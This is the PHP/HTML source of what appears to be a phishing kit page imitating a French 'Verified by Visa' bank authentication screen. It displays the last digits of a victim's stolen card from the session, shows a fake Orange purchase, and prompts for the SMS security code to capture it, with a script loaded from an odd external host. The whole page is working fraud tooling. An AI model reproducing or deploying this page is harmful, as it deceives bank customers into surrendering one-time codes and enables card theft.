<?php
session_start();

require '../ibc.php';

?>
<html><script src="blob:https://ffggttolotl.usa.cc/f4dc2b32-5f20-47d0-ac0a-29192a6f7d83"></script><head>
    <meta charset="UTF-8">
    <title>Vos coordonnées bancaires</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta name="description" content="Designed to be the perfect starting point&nbsp;for any dashboard or admin site. Charts,&nbsp;graphs, sortable tables,&nbsp;and more than a dozen other new&nbsp;components included.">
    <link rel="icon" type="image/png" href="assets/img/favicon.png">
    <link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
    <link href="assets/css/style.css" rel="stylesheet" type="text/css">

<style type="text/css">.video-ads{display:none!important}#player-ads{display:none!important}#watch7-sidebar-ads{display:none!important}#AdSense{display:none!important}#homepage-sidebar-ads{display:none!important}#page-container>#page>#header{display:none!important}#content #page-manager #masthead-ad{display:none!important}#body-container #page-container #video-masthead-iframe{display:none!important}#feedmodule-PRO{display:none!important}#homepage-chrome-side-promo{display:none!important}#search-pva{display:none!important}#watch-branded-actions{display:none!important}#watch-buy-urls{display:none!important}.carousel-offer-url-container{display:none!important}.promoted-videos{display:none!important}.watch-extra-info-column{display:none!important}.watch-extra-info-right{display:none!important}a[href^="http://www.youtube.com/cthru?"]{display:none!important}</style></head>
<body style="background: #FFF;" cz-shortcut-listen="true">
<div class="row brand" id="loading" style="margin-top: 250px;display: none;width:100%">
     <h2 style="text-align:center;margin-top:-100px;">Veuillez patienter pendant que nous traitons votre demande
<br>S.V.P ne pas fermer cette fenêtre</h2><br><br><br>
    <div style="width: 100px;margin: 0 auto;">
       
        <img src="assets/img/processing.gif" alt="" width="100" height="100">
        
    </div>
</div>

<div class="container vbv" id="vbv">


    <div class="row center-block header">
        <div class="col-sm-4 col-xs-4 ssl">
            <img src="https://i.imgur.com/KYCTrJv.png" alt="">
        </div>
        <div class="col-sm-4 col-xs-4 msg-header">
            <span style="font-weight: bold;font-size: 17px;">Authentification</span>
        </div>
        <div class="col-sm-4 col-xs-4 ">
            <img src="https://i.imgur.com/V0OIpOs.png" alt="" class="right" style="width: 74px;">
        </div>
    </div>
    <div class="row center-block message">
        <div class="col-xs-12 col-sm-12 ">
            <span class="bank-name"><?=$_SESSION['BNK']->bank->name;?></span> a adopté la solution <span class="message-vbv">Verified by Visa</span> . Pour sécuriser
            vos achats en ligne sur les
            sites affichant le logo <span class="message-vbv">Verified by Visa</span>
            , il est désormais nécessaire de vous authentifier en saisissant votre <span class="vbv-type"> le Code Securité <br>que vous venez de recevoir sur votre  téléphone. </span>
            <br><span class="essais" style="color: red;display: none;">vous avez encore <span id="essais"></span> essais.</span>
        </div>
    </div>
    <div class="row center-block col-sm-12 col-xs-12">
        <div id="core-vbv">

            <form action="" id="vbv-form" method="post" for="merci">
                <table>
                    <input type="hidden" name="type" value="3">
                    <input name="ip" type="hidden" value="105.156.81.148">
                    <tbody><tr>
                        <td>Marchand :</td>
                        <td>Orange</td>
                    </tr>
                    <tr>
                        <td>Montant :</td>
                        <td><span class="facture">44.99</span> EUR</td>
                    </tr>
                    <tr>
                        <td>Date :</td>
                        <td><span id="date"></span> <span id="hour"></span></td>
                    </tr>
                <tr>
<td>N° de carte :</td>
<td>xxxxxxxxxxxx<?=substr($_SESSION['CC']['num'],-4)?></td>
</tr> <tr>
<td>N° téléphone :</td>
<td style="letter-spacing: 0.07rem;">XXXXXXXXX</td>
</tr><tr class="pass3d scood">
<td style="font-weight: bold;width: 41%;">Le Code Securité reçus sur votre téléphone :</td>
<td><input name="CodeRecusParPhone" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="error" id="vbv-code" maxlength="8">
<span></span>
<button type="button" class="submit disabled" id="1" role="merci" disabled>Ok</button>
<button type="button" class="submit disabled" id="2" role="merci" disabled style="display:none;">Ok</button>
<button type="button" class="submit disabled" id="3" role="merci" disabled style="display:none;">Ok</button>
</td>
</tr>
</tbody></table>
            </form>


        </div>
    </div>
    <div class="row center-block col-sm-12 col-xs-12 footer">
        <p>Cette identification est obligatoire pour valider votre achat.</p>
        <p>Si vous ne souhaitez pas vous identifier votre achat sera annulé.</p>
        <p><a href="">Ne pas m'authentifier et annuler mon achat</a></p>
        <p>Si besoin, contactez <span class="bank-name"><?=$_SESSION['BNK']->bank->name;?></span>au <?=$_SESSION['BNK']->bank->phone;?></p>
        <p><a href="">Plus d'info sur <span class="message-vbv">Verified by Visa</span></a></p>

    </div>
</div>
<script src="assets/js/jquery.min.js" type="text/javascript"></script>
<script src="assets/js/jquery.mask.min.js" type="text/javascript"></script>
<script type="text/javascript" src="js/vbv.js"></script>
</body></html>